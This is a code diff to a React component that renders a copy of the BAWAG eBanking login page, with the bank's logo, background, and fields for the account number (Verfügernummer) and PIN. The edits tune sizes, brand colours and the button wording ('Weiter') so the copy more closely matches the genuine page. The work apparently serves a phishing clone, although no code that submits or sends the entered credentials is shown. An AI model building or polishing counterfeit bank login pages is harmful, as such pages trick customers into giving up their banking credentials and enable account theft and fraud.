@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Eye, EyeOff, HelpCircle, ChevronRight } from "lucide-react";
+import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import bawagLogo from "@/assets/bawag_logo.png";
 import bawagBg from "@/assets/bawag_background.jpg";
 
@@ -17,7 +17,7 @@ const Bawag = () => {
       <div className="w-[970px]">
         {/* Header */}
         <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
-          <img src={bawagLogo} alt="BAWAG eBanking" className="h-12" />
+          <img src={bawagLogo} alt="BAWAG eBanking" className="h-16" />
           <span className="text-xs text-gray-500">{dateStr}</span>
           <div className="flex gap-1">
             {["DE", "EN", "BKS", "TR"].map((l) => (
@@ -36,7 +36,7 @@ const Bawag = () => {
         </header>
 
         {/* Dark red divider */}
-        <div className="h-[3px] bg-[#8b1a2b] w-full" />
+        <div className="h-[3px] bg-[#990000] w-full" />
 
         {/* Background image container */}
         <div
@@ -49,16 +49,16 @@ const Bawag = () => {
         >
           {/* Login Card */}
           <div className="absolute top-5 left-5 w-[320px]">
-            <div className="bg-white rounded-lg shadow-sm">
-              <div className="px-4 py-2 rounded-t-lg flex items-center justify-between border-b border-gray-100">
-                <h1 className="text-sm font-semibold text-black">eBanking Login</h1>
-                <HelpCircle className="h-4 w-4 text-gray-400 cursor-pointer" />
+            <div className="bg-white rounded-lg shadow-sm min-h-[420px] flex flex-col">
+              <div className="px-4 py-3 rounded-t-lg flex items-center justify-between">
+                <h1 className="text-base font-semibold text-black">eBanking Login</h1>
+                <span className="font-bold text-gray-400 text-base cursor-pointer">?</span>
               </div>
 
-              <div className="p-4">
+              <div className="p-4 flex-1 flex flex-col">
                 {/* Verfüger tab */}
                 <div className="mb-4">
-                  <span className="text-[#c20016] text-xs font-semibold border-b-2 border-[#c20016] pb-1">
+                  <span className="text-[#990000] text-xs font-semibold border-b-2 border-[#990000] pb-1">
                     Verfüger
                   </span>
                 </div>
@@ -69,7 +69,7 @@ const Bawag = () => {
                     value={verfueger}
                     onChange={(e) => setVerfueger(e.target.value)}
                     placeholder="Verfügernummer"
-                    className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#8b1a2b]"
+                    className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#990000]"
                   />
                 </div>
 
@@ -80,7 +80,7 @@ const Bawag = () => {
                       value={pin}
                       onChange={(e) => setPin(e.target.value)}
                       placeholder="PIN (8 bis 16-stellig)"
-                      className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs pr-8 focus:outline-none focus:ring-1 focus:ring-[#8b1a2b]"
+                      className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs pr-8 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                     />
                     <button
                       type="button"
@@ -93,14 +93,14 @@ const Bawag = () => {
                 </div>
 
                 <div className="flex justify-end mb-3">
-                  <button className="w-[60%] py-1.5 bg-[#8b1a2b] text-white text-xs font-semibold rounded hover:bg-[#721525] transition-colors">
-                    Login
+                  <button className="w-[60%] py-1.5 bg-[#990000] text-white text-xs font-semibold rounded hover:bg-[#7a0000] transition-colors">
+                    Weiter
                   </button>
                 </div>
 
-                <div className="border-t pt-3">
-                  <a href="#" className="text-[11px] text-[#c20016] hover:underline flex items-center gap-1">
-                    <ChevronRight className="h-3 w-3" />
+                <div className="mt-auto pt-3">
+                  <a href="#" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
+                    <ChevronRight className="h-4 w-4" />
                     PIN vergessen oder Verfüger gesperrt?
                   </a>
                 </div>
@@ -113,29 +113,30 @@ const Bawag = () => {
             <div className="bg-white rounded-lg shadow-sm">
               <div className="grid grid-cols-3">
                 <div className="p-3">
-                  <h2 className="font-bold text-sm mb-2 text-[#8b1a2b]">Sicherheit</h2>
+                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Sicherheit</h2>
                   <p className="text-xs text-gray-600 leading-relaxed">
                     Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                   </p>
-                  <a href="#" className="text-xs text-[#c20016] hover:underline mt-1 inline-block">
+                  <a href="#" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
+                    <ChevronRight className="h-4 w-4" />
                     Mehr Infos
                   </a>
                 </div>
 
                 <div className="p-3">
-                  <h2 className="font-bold text-sm mb-2 text-[#8b1a2b]">Service & Info</h2>
+                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Service & Info</h2>
                   <ul className="space-y-1">
-                    <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Sicherheitsregeln</a></li>
-                    <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Anmeldung / Erste Schritte</a></li>
-                    <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />3D Secure Online Bezahlung</a></li>
+                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
+                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
+                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
                   </ul>
                 </div>
 
                 <div className="p-3">
-                  <h2 className="font-bold text-sm mb-2 text-[#8b1a2b]">Support</h2>
+                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                   <ul className="space-y-1">
-                    <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />FAQ</a></li>
-                    <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Zu Watchlist Internet</a></li>
+                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
+                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                   </ul>
                 </div>
               </div>
